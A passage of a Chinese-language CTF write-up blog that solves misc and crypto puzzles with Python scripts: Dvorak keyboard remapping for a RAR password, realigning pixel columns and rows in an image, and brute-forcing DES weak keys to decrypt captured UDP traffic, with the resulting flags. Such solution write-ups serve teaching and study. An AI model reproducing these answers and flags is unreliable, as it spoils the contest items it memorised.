</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span></span></span></code></pre></td></tr></table></div></div><p>虽然这个二维码有点问题，但是用微信扫码可以得到：<code>ssdsahjkhsdfhhkjjhksdfjhds</code></p><p>但是这个也不是压缩包的解压密码，因此我们回头继续看流量包</p><p>发现还传了一张jpg图片，并且jpg图片中有提示：<code>I've heard of Dvorak</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817225336021.png alt=/posts/bb1da35/imgs/image-20250817225336021.png height=1836 width=2810></p><p>Dvorak是一种键盘布局，详细内容可以看我博客里的 <a href=https://goodlunatic.github.io/posts/1ad9200/ target=_blank rel="external nofollow noopener noreferrer">Misc Guide</a></p><p>因此结合之前得到的内容，猜测我们需要把扫码得到的字符串转换到Dvorak上</p><p>或者是把扫码得到的字符串从Dvorak转换过来，我这里就直接写个脚本转了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>qwerty_lower</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&#34;&#34;qwertyuiop[]\asdfghjkl;&#39;zxcvbnm,./&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>dvorak_lower</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&#34;&#34;&#39;,.pyfgcrl/=\aoeuidhtns-;qjkxbmwvz&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>qwerty_upper</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&#34;&#34;QWERTYUIOP[]\ASDFGHJKL;&#39;ZXCVBNM,./&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl><span class=n>dvorak_upper</span> <span class=o>=</span> <span class=sa>r</span><span class=s2>&#34;&#34;&#34;&#34;&lt;&gt;PYFGCRL?+|AOEUIDHTNS_:QJKXBMWVZ&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 构建映射字典</span>
</span></span><span class=line><span class=cl><span class=n>d2q</span> <span class=o>=</span> <span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=n>dvorak_lower</span> <span class=o>+</span> <span class=n>dvorak_upper</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>qwerty_lower</span> <span class=o>+</span> <span class=n>qwerty_upper</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>q2d</span> <span class=o>=</span> <span class=nb>str</span><span class=o>.</span><span class=n>maketrans</span><span class=p>(</span><span class=n>qwerty_lower</span> <span class=o>+</span> <span class=n>qwerty_upper</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>dvorak_lower</span> <span class=o>+</span> <span class=n>dvorak_upper</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>dvorak_to_qwerty</span><span class=p>(</span><span class=n>text</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=n>d2q</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>qwerty_to_dvorak</span><span class=p>(</span><span class=n>text</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>text</span><span class=o>.</span><span class=n>translate</span><span class=p>(</span><span class=n>q2d</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>text</span> <span class=o>=</span> <span class=s2>&#34;ssdsahjkhsdfhhkjjhksdfjhds&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>dvorak_to_qwerty</span><span class=p>(</span><span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>qwerty_to_dvorak</span><span class=p>(</span><span class=n>text</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=c1># ;;h;ajcvj;hyjjvccjv;hycjh;</span>
</span></span><span class=line><span class=cl>    <span class=c1># ooeoadhtdoeuddthhdtoeuhdeo</span></span></span></code></pre></td></tr></table></div></div><p>其中 <code>ooeoadhtdoeuddthhdtoeuhdeo</code> 就是rar的解压密码</p><p>解压后即可得到最后的flag：<code>DASCTF{jhughudshhjg_qiwjains_jsmka}</code></p><h2 class=heading-element id=题目名称-数字雨2025天山固网><span>题目名称 数字雨(2025天山固网)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e6%95%b0%e5%ad%97%e9%9b%a82025%e5%a4%a9%e5%b1%b1%e5%9b%ba%e7%bd%91 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了下面这张PNG（图片比较大，有40多兆，因为宽高是6000x4000）</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817223412543.png alt=/posts/bb1da35/imgs/image-20250817223412543.png height=1336 width=2248></p><p>我们用PS打开查看，发现每一列都有长度为80的同一绿色像素(18, 255, 2)</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817223617268.png alt=/posts/bb1da35/imgs/image-20250817223617268.png height=1836 width=2804></p><p>如果做过b01lers的image_adjustments这道题的师傅肯定一眼就知道图片的意图是啥了</p><p>就是要我们为每列像素加一个偏移量，让每一列中的这80个绿色像素都对齐</p><p>具体原理和步骤可以参考的我的另一篇博客：<a href=https://goodlunatic.github.io/posts/00658ee/ target=_blank rel="external nofollow noopener noreferrer">2020 b01lers Misc image_adjustments 赛题详解</a></p><p>写个脚本对齐后，就可以得到下图</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817223934477.png alt=/posts/bb1da35/imgs/image-20250817223934477.png height=1356 width=2158></p><p>我们再次用PS打开查看</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817224022930.png alt=/posts/bb1da35/imgs/image-20250817224022930.png height=1836 width=2804></p><p>发现这次是每一行有80个同一绿色像素(18, 255, 2)了，因此我们和上面一样</p><p>尝试计算偏移量并对齐每一行的绿色像素即可得到最后的flag: <code>DASCTF{herE_c0mes_thE_D1g1taL_ra1n}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250817224156497.png alt=/posts/bb1da35/imgs/image-20250817224156497.png height=1272 width=2082></p><p>最后附上完整的解题脚本：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>numpy</span> <span class=k>as</span> <span class=nn>np</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>PIL</span> <span class=kn>import</span> <span class=n>Image</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>process_image_cols</span><span class=p>(</span><span class=n>input_path</span><span class=p>,</span> <span class=n>output_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 打开图像并转换为NumPy数组</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>input_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[:</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>green_pixel</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=mi>18</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>2</span><span class=p>],</span> <span class=n>dtype</span><span class=o>=</span><span class=n>img_array</span><span class=o>.</span><span class=n>dtype</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=c1># 获取当前列的所有像素</span>
</span></span><span class=line><span class=cl>        <span class=n>column</span> <span class=o>=</span> <span class=n>img_array</span><span class=p>[:,</span> <span class=n>x</span><span class=p>,</span> <span class=p>:]</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># 尝试所有可能的偏移量</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=c1># 应用偏移</span>
</span></span><span class=line><span class=cl>            <span class=n>shifted_column</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>roll</span><span class=p>(</span><span class=n>column</span><span class=p>,</span> <span class=n>i</span><span class=p>,</span> <span class=n>axis</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>img_array</span><span class=p>[:,</span> <span class=n>x</span><span class=p>,</span> <span class=p>:]</span> <span class=o>=</span> <span class=n>shifted_column</span>
</span></span><span class=line><span class=cl>            <span class=c1># 检查前80行是否都是绿色像素</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>np</span><span class=o>.</span><span class=n>all</span><span class=p>(</span><span class=n>img_array</span><span class=p>[:</span><span class=mi>80</span><span class=p>,</span> <span class=n>x</span><span class=p>,</span> <span class=p>:]</span> <span class=o>==</span> <span class=n>green_pixel</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s2> 列偏移量调整完毕: </span><span class=si>{</span><span class=n>i</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 将NumPy数组转换回PIL图像并保存</span>
</span></span><span class=line><span class=cl>    <span class=n>result_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>img_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result_img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>process_image_rows</span><span class=p>(</span><span class=n>input_path</span><span class=p>,</span> <span class=n>output_path</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># 打开图像并转换为NumPy数组</span>
</span></span><span class=line><span class=cl>    <span class=n>img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>input_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>img_array</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>(</span><span class=n>img</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span><span class=p>,</span> <span class=n>w</span> <span class=o>=</span> <span class=n>img_array</span><span class=o>.</span><span class=n>shape</span><span class=p>[:</span><span class=mi>2</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>green_pixel</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>array</span><span class=p>([</span><span class=mi>18</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=mi>2</span><span class=p>],</span> <span class=n>dtype</span><span class=o>=</span><span class=n>img_array</span><span class=o>.</span><span class=n>dtype</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>y</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>h</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>current_row</span> <span class=o>=</span> <span class=n>img_array</span><span class=p>[</span><span class=n>y</span><span class=p>,</span> <span class=p>:,</span> <span class=p>:]</span><span class=o>.</span><span class=n>copy</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=c1># 尝试所有可能的水平偏移量</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>shift</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>w</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>shifted_row</span> <span class=o>=</span> <span class=n>np</span><span class=o>.</span><span class=n>roll</span><span class=p>(</span><span class=n>current_row</span><span class=p>,</span> <span class=n>shift</span><span class=p>,</span> <span class=n>axis</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            
</span></span><span class=line><span class=cl>            <span class=c1># 检查前80个像素是否全部是绿色</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>np</span><span class=o>.</span><span class=n>all</span><span class=p>(</span><span class=n>shifted_row</span><span class=p>[:</span><span class=mi>80</span><span class=p>]</span> <span class=o>==</span> <span class=n>green_pixel</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] </span><span class=si>{</span><span class=n>y</span><span class=si>}</span><span class=s2> 行偏移量调整完毕: </span><span class=si>{</span><span class=n>shift</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>img_array</span><span class=p>[</span><span class=n>y</span><span class=p>,</span> <span class=p>:,</span> <span class=p>:]</span> <span class=o>=</span> <span class=n>shifted_row</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>result_img</span> <span class=o>=</span> <span class=n>Image</span><span class=o>.</span><span class=n>fromarray</span><span class=p>(</span><span class=n>img_array</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result_img</span><span class=o>.</span><span class=n>save</span><span class=p>(</span><span class=n>output_path</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>result_img</span><span class=o>.</span><span class=n>show</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>process_image_cols</span><span class=p>(</span><span class=s1>&#39;img.png&#39;</span><span class=p>,</span> <span class=s1>&#39;col_solved.png&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>process_image_rows</span><span class=p>(</span><span class=s1>&#39;col_solved.png&#39;</span><span class=p>,</span><span class=s1>&#39;flag.png&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h2 class=heading-element id=题目名称-capture2025年浙江省信息通信业职业技能竟赛-数据安全管理员竞赛决赛><span>题目名称 capture(2025年浙江省信息通信业职业技能竟赛-数据安全管理员竞赛决赛)</span>
<a href=#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-capture2025%e5%b9%b4%e6%b5%99%e6%b1%9f%e7%9c%81%e4%bf%a1%e6%81%af%e9%80%9a%e4%bf%a1%e4%b8%9a%e8%81%8c%e4%b8%9a%e6%8a%80%e8%83%bd%e7%ab%9f%e8%b5%9b-%e6%95%b0%e6%8d%ae%e5%ae%89%e5%85%a8%e7%ae%a1%e7%90%86%e5%91%98%e7%ab%9e%e8%b5%9b%e5%86%b3%e8%b5%9b class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h2><p>题目附件给了一个很小的pcapng流量包（27kb）</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818225242004.png alt=/posts/bb1da35/imgs/image-20250818225242004.png height=1836 width=2810></p><p>打开翻看发现是100个UDP数据包，然后看样子是传了json一样的数据</p><p>因此我们可以直接 <code>strings capture.pcapng > 1.txt</code> 把里面的内容导出来</p><p>导出来后，手动删去干扰的字符，可以得到如下内容：</p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818225541825.png alt=/posts/bb1da35/imgs/image-20250818225541825.png height=1708 width=2758></p><p>提示了是DES-xxx加密算法，并且用了四个不同的密钥</p><p>仔细观察可以发现，每个密文的前面部分内容都是一样的</p><p>因此猜测明文的开头是一样的，并且key_id相同的密文，用的密钥也是一样的</p><p>之前就听说过DES是由于安全性而被AES所替代了，并且在网上搜索过程中发现了下面这篇文章：</p><p><a href=https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html target=_blank rel="external nofollow noopener noreferrer">https://noob-atbash.github.io/CTF-writeups/cyberwar/crypto/chal-5.html</a></p><p>尝试用文中的四个弱密钥去解密，发现有一半的数据可以正常解出来</p><p>并且可以得到解密后明文的开头是 <code>FLAG_HEADER:DATA</code></p><p>然后仔细看了<a href=https://crypto.stackexchange.com/questions/7938/may-the-problem-with-des-using-ofb-mode-be-generalized-for-all-feistel-ciphers target=_blank rel="external nofollow noopener noreferrer">这篇帖子</a>后，尝试用 <code>\x00 \xFF \xF0 \x0F \x1E \xE1</code> 去生成密钥爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>DES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>product</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=n>b64decode</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>BYTES</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x1E</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xE1</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xF0</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x0F</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\xFF</span><span class=s1>&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>generate_keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>byte_combinations</span> <span class=o>=</span> <span class=n>product</span><span class=p>(</span><span class=n>BYTES</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>combo</span> <span class=ow>in</span> <span class=n>byte_combinations</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>yield</span> <span class=sa>b</span><span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>combo</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>brute_force_decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>generate_keys</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=n>cipher</span> <span class=o>=</span> <span class=n>DES</span><span class=o>.</span><span class=n>new</span><span class=p>(</span><span class=n>key</span><span class=p>,</span> <span class=n>DES</span><span class=o>.</span><span class=n>MODE_ECB</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>decrypted</span> <span class=o>=</span> <span class=n>cipher</span><span class=o>.</span><span class=n>decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>decrypted</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;FLAG&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Found valid key: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Decrypted data: </span><span class=si>{</span><span class=n>decrypted</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>encrypted_data</span> <span class=o>=</span> <span class=n>b64decode</span><span class=p>(</span><span class=s2>&#34;ftNbIBh+yU8rzOhvbAplhB1hoQkblsKa+uGaNnTudD2LGw0+5fOHXycXZDujJFWwHZjIg5bfDpKFsqI18Ts7ZGG8dpqWAzar&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>found_key</span> <span class=o>=</span> <span class=n>brute_force_decrypt</span><span class=p>(</span><span class=n>encrypted_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=ow>not</span> <span class=n>found_key</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No valid key found.&#34;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><p>发现一会就能爆破出密钥，用得到的密钥去解密即可得到最后的flag：<code>flag{9adee0d8d9db40fc99e8366bf2bd474d}</code></p><p><img loading=lazy src=/posts/bb1da35/imgs/image-20250818230628193.png alt=/posts/bb1da35/imgs/image-20250818230628193.png height=1768 width=2278></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Cipher</span> <span class=kn>import</span> <span class=n>DES</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>base64</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key_list</span> <span class=o>=</span> <span class=p>[</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x1E\x1E\x1E\x1E\x0F\x0F\x0F\x0F</span><span class=s2>&#34;</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xE1\xE1\xE1\xE1\xF0\xF0\xF0\xF0</span><span class=s2>&#34;</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\xff\x00\xff\x00\xff\x00\xff\x00</span><span class=s2>&#34;</span><span class=p>,</span><span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00\xff\x00\xff\x00\xff\x00\xff</span><span class=s2>&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
